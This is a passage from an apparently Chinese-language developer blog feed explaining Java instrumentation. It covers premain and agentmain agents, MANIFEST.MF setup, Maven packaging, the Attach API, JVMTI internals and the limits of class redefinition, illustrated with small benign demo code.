vim">-agentli<span class="hljs-variable">b:</span><span class="hljs-symbol">&lt;libname&gt;</span>[=&lt;选项&gt;]<br>              加载本机代理库 <span class="hljs-symbol">&lt;libname&gt;</span>, 例如 -agentli<span class="hljs-variable">b:hprof</span><br>              另请参阅 -agentli<span class="hljs-variable">b:jdwp</span>=<span class="hljs-keyword">help</span> 和 -agentli<span class="hljs-variable">b:hprof</span>=<span class="hljs-keyword">help</span><br>-agentpath:<span class="hljs-symbol">&lt;pathname&gt;</span>[=&lt;选项&gt;]<br>              按完整路径名加载本机代理库<br>-javaagen<span class="hljs-variable">t:</span><span class="hljs-symbol">&lt;jarpath&gt;</span>[=&lt;选项&gt;]<br>              加载 Java 编程语言代理, 请参阅 java.lang.instrument<br></code></pre></td></tr></table></figure><p>在<code>java.lang.instrument</code>中，提供了一些工具帮助开发人员在Java程序运行时，动态的修改系统中的Class类型，很重要的一个组件就是Javaagent</p><p>我们主要看<code>ClassFileTransformer</code>和<code>Instrumentation</code>这两个类</p><p><code>Premain-Class</code>指定的类需要实现<code>premain()</code>方法必须满足如下两种类型：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">premain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span></span><br><span class="hljs-function">    </span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">premain</span><span class="hljs-params">(String agentArgs)</span></span><br></code></pre></td></tr></table></figure><p>JVM会优先加载带<code>Instrumentation</code>签名的方法，没有加载成功会加载第二个方法</p><p>逻辑在<code>sun.instrument.InstrumentationImpl#loadClassAndStartAgent</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    var6 = var5.getDeclaredMethod(var2, String.class, Instrumentation.class);<br>    var8 = <span class="hljs-keyword">true</span>;<br>&#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException var13) &#123;<br>    var7 = var13;<br>&#125;<br><br><span class="hljs-keyword">if</span> (var6 == <span class="hljs-keyword">null</span>) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        var6 = var5.getDeclaredMethod(var2, String.class);<br>    &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException var12) &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>接口<code>Instrumentation</code>定义如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Instrumentation</span> </span>&#123;<br>    <br>    <span class="hljs-comment">//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。</span><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">addTransformer</span><span class="hljs-params">(ClassFileTransformer transformer, <span class="hljs-keyword">boolean</span> canRetransform)</span></span>;<br><br>    <span class="hljs-comment">//在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">addTransformer</span><span class="hljs-params">(ClassFileTransformer transformer)</span></span>;<br><br>    <span class="hljs-comment">//删除一个类转换器</span><br>    <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">removeTransformer</span><span class="hljs-params">(ClassFileTransformer transformer)</span></span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">isRetransformClassesSupported</span><span class="hljs-params">()</span></span>;<br><br>    <span class="hljs-comment">//在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">retransformClasses</span><span class="hljs-params">(Class&lt;?&gt;... classes)</span> <span class="hljs-keyword">throws</span> UnmodifiableClassException</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">isRedefineClassesSupported</span><span class="hljs-params">()</span></span>;<br><br>    <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">redefineClasses</span><span class="hljs-params">(ClassDefinition... definitions)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span>  ClassNotFoundException, UnmodifiableClassException</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">isModifiableClass</span><span class="hljs-params">(Class&lt;?&gt; theClass)</span></span>;<br><br>    <span class="hljs-meta">@SuppressWarnings(&quot;rawtypes&quot;)</span><br>    Class[] getAllLoadedClasses();<br>  <br>    <span class="hljs-meta">@SuppressWarnings(&quot;rawtypes&quot;)</span><br>    Class[] getInitiatedClasses(ClassLoader loader);<br><br>    <span class="hljs-comment">//获取一个对象的大小</span><br>    <span class="hljs-function"><span class="hljs-keyword">long</span> <span class="hljs-title">getObjectSize</span><span class="hljs-params">(Object objectToSize)</span></span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">appendToBootstrapClassLoaderSearch</span><span class="hljs-params">(JarFile jarfile)</span></span>;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">appendToSystemClassLoaderSearch</span><span class="hljs-params">(JarFile jarfile)</span></span>;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">isNativeMethodPrefixSupported</span><span class="hljs-params">()</span></span>;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setNativeMethodPrefix</span><span class="hljs-params">(ClassFileTransformer transformer, String prefix)</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用javaagent的步骤：</p><ol><li>定义MANIFEST.MF文件，必须设置<code>Premain-Class</code>字段，通常也会加入<code>Can-Redeine-Classes</code>和<code>Can-Retransform-Classes</code>字段</li><li>创建的<code>Premain-Class</code>指定的类，类中必须包含<code>premain</code>方法，方法逻辑自定义</li><li>将<code>premain</code>的类和<code>MANIFEST.MF</code>文件打成jar包</li><li>使用参数<code>-javaagent:/path/to/jar</code></li></ol><p>此时JVM会启动应用前先执行<code>premain</code>方法，大部分的类加载都会通过该方法，部分系统类会先于agent执行，因此可以去拦截用户的类加载。进一步地，使用第三方的字节码编译工具，例如ASM，javaassit可以实现重写类的操作</p><p>示例代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.george.agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DefineTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ClassFileTransformer</span> </span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-keyword">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br>        System.out.println(<span class="hljs-string">&quot;premain load Class: &quot;</span> + className);<br>        <span class="hljs-keyword">return</span> classfileBuffer;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PreMainTraceAgent</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">premain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;agentArgs: &quot;</span> + agentArgs);<br>        inst.addTransformer(<span class="hljs-keyword">new</span> DefineTransformer(), <span class="hljs-keyword">true</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>上面的类实现了带<code>Instrumentation</code>参数的<code>premain</code>方法，然后调用了<code>addTransformer</code>方法对启动时的类进行拦截</p><p>MANIFEST.MF <strong>最后一行是不可少的空行</strong><br>如果不手动指定MANIFEST，直接使用插件等方式进行打包，默认会生成一个MANIFEST.MF文件</p><p>在resources/META-INF新建：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Manifest-Version:</span> <span class="hljs-number">1.0</span><br><span class="hljs-attr">Premain-Class:</span> <span class="hljs-string">com.george.agent.PreMainTraceAgent</span><br><span class="hljs-attr">Can-Redefine-Classes:</span> <span class="hljs-literal">true</span><br><span class="hljs-attr">Can-Retransform-Classes:</span> <span class="hljs-literal">true</span><br><br></code></pre></td></tr></table></figure><p>给maven插件指定使用自定义MANIFEST.MF</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-jar-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.3.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">archive</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">manifestFile</span>&gt;</span><br>                        src/main/resources/META-INF/MANIFEST.MF<br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">manifestFile</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">archive</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br></code></pre></td></tr></table></figure><p>否则使用&lt;manifestEntries&gt;代替&lt;manifestFile&gt;指定</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">manifestEntries</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Premain-Class</span>&gt;</span>com.george.agent.PreMainTraceAgent<span class="hljs-tag">&lt;/<span class="hljs-name">Premain-Class</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Can-Redefine-Classes</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">Can-Redefine-Classes</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Can-Retransform-Classes</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">Can-Retransform-Classes</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">manifestEntries</span>&gt;</span><br></code></pre></td></tr></table></figure><p>一个java程序中<code>-javaagent</code>参数的个数是没有限制的，所以可以添加任意多个javaagent，所有的javaagent会按照你定义的顺序执行，例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -javaagent:agent1.jar -javaagent:agent2.jar -jar MyProgram.jar<br></code></pre></td></tr></table></figure><p>程序执行的顺序将会是：</p><p><code>MyAgent1.premain -&gt; MyAgent2.premain -&gt; MyProgram.main</code></p><p>然后随便写一个类运行，比如打印一个hello world后，运行参数加入</p><blockquote><p>-javaagent:D:\program\java\javaagent\target\javaagent-1.0-SNAPSHOT.jar</p></blockquote><p>既然可以拦截，那么就可以修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.george.agent;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DefineTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ClassFileTransformer</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-keyword">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br>        System.out.println(<span class="hljs-string">&quot;premain load Class: &quot;</span> + className);<br>        <span class="hljs-keyword">if</span>(className.equals(<span class="hljs-string">&quot;java/util/Random&quot;</span>))&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                ClassPool cp = ClassPool.getDefault();<br>                CtClass ctClass = cp.get(<span class="hljs-string">&quot;java.util.Random&quot;</span>);<br>                CtMethod nextIntM = ctClass.getDeclaredMethod(<span class="hljs-string">&quot;nextInt&quot;</span>);<br>                String methodBody = <span class="hljs-string">&quot;&#123;System.out.println(\&quot;zero!!!\&quot;);\n&quot;</span> +<br>                        <span class="hljs-string">&quot;return next(32);&#125;&quot;</span>;<br>                nextIntM.setBody(methodBody);<br>                <span class="hljs-keyword">byte</span>[] bytecode = ctClass.toBytecode();<br>                ctClass.detach();<br>                <span class="hljs-keyword">return</span> bytecode;<br>            &#125; <span class="hljs-keyword">catch</span> (NotFoundException | CannotCompileException | IOException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> classfileBuffer;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PreMainTraceAgent</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">premain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;agentArgs: &quot;</span> + agentArgs);<br>        inst.addTransformer(<span class="hljs-keyword">new</span> DefineTransformer(), <span class="hljs-keyword">true</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="JVM启动后动态Instrument"><a href="#JVM启动后动态Instrument" class="headerlink" title="JVM启动后动态Instrument"></a>JVM启动后动态Instrument</h2><p>上面的Instrument是JDK1.5引入的，开发者只能在main加载前进行拦截，在JAVA SE 6的Instrumentation中提供了新的代理操作方法：agentmain，可以在main函数运行之后再运行</p><p>类比premain方法，需要编写一个agentmain方法</p><p><code>Agent-Class</code>指定的类需要实现<code>agentmain()</code>方法必须满足如下两种类型：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">agentmain</span> <span class="hljs-params">(String agentArgs, Instrumentation inst)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">agentmain</span> <span class="hljs-params">(String agentArgs)</span></span><br></code></pre></td></tr></table></figure><p>优先加载带<code>Instrumentation</code>签名的方法，没有加载成功会加载第二个方法</p><p>采用attach机制，被代理的目标程序VM有可能很早之前已经启动，当然其所有类已经被加载完成，这个时候需要借助<code>Instrumentation#retransformClasses(Class&lt;?&gt;... classes)</code>让对应的类可以重新转换，从而激活重新转换的类执行<code>ClassFileTransformer</code>列表中的回调</p><p>在模块-依赖中添加<code>tools.jar</code>的依赖，在<code>com.sun.tools.attach</code>中，有两个主要的类实现了Attach API</p><p><code>VirtualMachine</code>和<code>VirtualMachineDescriptor</code>：</p><p>前者可以监控目标JVM，获取系统信息如：内存dump，线程dump，类信息，loadAgent，Attach，Detach；我们可以通过attach方法，传入目标JVM的PID，就能连接到远程JVM；代理类注入操作只是它众多功能中的一个，通过<code>loadAgent</code>方法向JVM注册一个代理程序agent，在该agent的代理程序中会得到一个<code>Instrumentation</code>实例，该实例可以  在class加载前改变class的字节码，也可以在class加载后重新加载。在调用<code>Instrumentation</code>实例的方法时，这些方法会使用<code>ClassFileTransformer</code>接口中提供的方法进行处理</p><p>后者是描述一个JVM的容器类，配合前者完成各种功能</p><p>通过<code>VirtualMachine.attach(PID)</code>，可以连接到目标JVM，之后通过<code>loadAgent(agentJarPath)</code>将agent的jar包注入进程，对应的进程就会调用<code>agentmain</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.george.agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DefineTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ClassFileTransformer</span></span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-keyword">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br>        System.out.println(<span class="hljs-string">&quot;sufmain load class&quot;</span> + className);<br>        <span class="hljs-keyword">return</span> classfileBuffer;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SufMainTraceAgent</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span>  <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">agentmain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span></span>&#123;<br>        inst.addTransformer(<span class="hljs-keyword">new</span> DefineTransformer());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Manifest-Version:</span> <span class="hljs-number">1.0</span><br><span class="hljs-attr">Agent-Class:</span> <span class="hljs-string">com.george.agent.SufMainTraceAgent</span><br><span class="hljs-attr">Can-Redefine-Classes:</span> <span class="hljs-literal">true</span><br><span class="hljs-attr">Can-Retransform-Classes:</span> <span class="hljs-literal">true</span><br><br></code></pre></td></tr></table></figure><p>同样在pom.xml指定使用MANIFEST.MF文件，打成jar包</p><p>测试这里使用自身的JVM进行agent注入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.tools.attach.*;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AttachVirtualMachine</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException </span>&#123;<br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        <span class="hljs-keyword">for</span> (VirtualMachineDescriptor x : list) &#123;<br>            System.out.println(x.displayName());<br>            <span class="hljs-comment">//这里找到自身类并注入</span><br>            <span class="hljs-keyword">if</span>(x.displayName().endsWith(<span class="hljs-string">&quot;AttachVirtualMachine&quot;</span>))&#123;<br>                VirtualMachine vm = VirtualMachine.attach(x.id());<br>                vm.loadAgent(<span class="hljs-string">&quot;D:\\program\\java\\javaattach\\target\\javaattach-1.0-SNAPSHOT.jar&quot;</span>);<br>                vm.detach();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Instrument原理"><a href="#Instrument原理" class="headerlink" title="Instrument原理"></a>Instrument原理</h2><p>Instrument的实现依赖于JVM暴露出来给用户的接口JVMTI(JVM Tool Interface)，JVMTI是基于事件驱动的，JVM每执行到一定的逻辑就会调用一些事件的回调接口（如果有的话），这些接口可以供开发者去扩展自己的逻辑。<code>JVMTIAgent</code>是一个利用<code>JVMTI</code>暴露出来的接口提供了代理启动时加载(agent on load)、代理通过attach形式加载(agent on attach)和代理卸载(agent on unload)功能的动态库。而<code>instrument agent</code>可以理解为一类<code>JVMTIAgent</code>动态库，别名是<code>JPLISAgent(Java Programming Language Instrumentation Services Agent)</code>，也就是<strong>专门为java语言编写的插桩服务提供支持的代理</strong></p><h5 id="启动时加载instrument-agent过程："><a href="#启动时加载instrument-agent过程：" class="headerlink" title="启动时加载instrument agent过程："></a>启动时加载instrument agent过程：</h5><ol><li>创建并初始化 JPLISAgent；</li><li>监听 <code>VMInit</code> 事件，在 JVM 初始化完成之后做下面的事情：<ol><li>创建 InstrumentationImpl 对象 ；</li><li>监听 ClassFileLoadHook 事件 ；</li><li>调用 InstrumentationImpl 的<code>loadClassAndCallPremain</code>方法，在这个方法里会去调用 javaagent 中 MANIFEST.MF 里指定的Premain-Class 类的 premain 方法 ；</li></ol></li><li>解析 javaagent 中 MANIFEST.MF 文件的参数，并根据这些参数来设置 JPLISAgent 里的一些内容。</li></ol><h5 id="运行时加载instrument-agent过程："><a href="#运行时加载instrument-agent过程：" class="headerlink" title="运行时加载instrument agent过程："></a>运行时加载instrument agent过程：</h5><p>通过 JVM 的attach机制来请求目标 JVM 加载对应的agent，过程大致如下：</p><ol><li>创建并初始化JPLISAgent；</li><li>解析 javaagent 里 MANIFEST.MF 里的参数；</li><li>创建 InstrumentationImpl 对象；</li><li>监听 ClassFileLoadHook 事件；</li><li>调用 InstrumentationImpl 的<code>loadClassAndCallAgentmain</code>方法，在这个方法里会去调用javaagent里 MANIFEST.MF 里指定的<code>Agent-Class</code>类的<code>agentmain</code>方法。</li></ol><h2 id="Instrumentation局限性"><a href="#Instrumentation局限性" class="headerlink" title="Instrumentation局限性"></a>Instrumentation局限性</h2><p>大多数情况下，我们使用Instrumentation都是使用其字节码插桩的功能，或者笼统说就是类重定义(Class Redefine)的功能，但是有以下的局限性：</p><ol><li>premain和agentmain两种方式修改字节码的时机都是类文件加载之后，也就是说必须要带有Class类型的参数，不能通过字节码文件和自定义的类名重新定义一个本来不存在的类。</li><li>类的字节码修改称为类转换(Class Transform)，类转换其实最终都回归到类重定义Instrumentation#redefineClasses()方法，此方法有以下限制：<ol><li>新类和老类的父类必须相同；</li><li>新类和老类实现的接口数也要相同，并且是相同的接口；</li><li>新类和老类访问符必须一致。 新类和老类字段数和字段名要一致；</li><li>新类和老类新增或删除的方法必须是private static/final修饰的；</li><li>可以修改方法体。</li></ol></li></ol><p>除了上面的方式，如果想要重新定义一个类，可以考虑基于类加载器隔离的方式：创建一个新的自定义类加载器去通过新的字节码去定义一个全新的类，不过也存在只能通过反射调用该全新类的局限性。</p>]]></content>
    
    
    <categories>
      
      <category>language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JDBC基础</title>
    <link href="/2023/03/15/JDBC%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/03/15/JDBC%E5%9F%BA%E7%A1%80/</url>
    
